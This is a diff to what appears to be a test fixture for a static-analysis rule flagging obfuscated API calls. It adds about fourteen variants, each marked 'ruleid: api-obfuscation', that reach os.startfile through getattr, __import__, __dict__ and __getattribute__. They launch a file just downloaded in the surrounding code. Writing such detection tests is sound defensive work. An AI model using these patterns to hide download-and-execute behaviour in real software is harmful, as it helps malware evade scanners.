@@ -15,19 +15,45 @@ def send():
             open(filename, 'wb').write(rq.content)
             
             # os.system('start '+filename)
+            # ruleid: api-obfuscation
             os.__dict__['startfile']('start '+filename)
+
+            # ruleid: api-obfuscation
             os.__dict__['startfile'].__call__('start '+filename)
+            # ruleid: api-obfuscation
             os.__getattribute__('startfile')('start '+filename)
+
+            # ruleid: api-obfuscation
             os.__getattribute__('startfile').__call__('start '+filename)
+
+            # ruleid: api-obfuscation
             getattr(os, 'startfile')('start '+filename)
+
+            # ruleid: api-obfuscation
             getattr(os, 'startfile').__call__('start '+filename)
+
+            # ruleid: api-obfuscation
             __import__('os').startfile('start '+filename)
+
+            # ruleid: api-obfuscation
             __import__('os').startfile.__call__('start '+filename)
+
+            # ruleid: api-obfuscation
             __import__('os').__dict__['startfile']('start '+filename)
+
+            # ruleid: api-obfuscation
             __import__('os').__dict__['startfile'].__call__('start '+filename)
+
+            # ruleid: api-obfuscation
             __import__('os').__getattribute__('startfile')('start '+filename)
+
+            # ruleid: api-obfuscation
             __import__('os').__getattribute__('startfile').__call__('start '+filename)
+
+            # ruleid: api-obfuscation
             getattr(__import__('os'), 'startfile')('start '+filename)
+
+            # ruleid: api-obfuscation
             getattr(__import__('os'), 'startfile').__call__('start '+filename)
     except:
         pass    
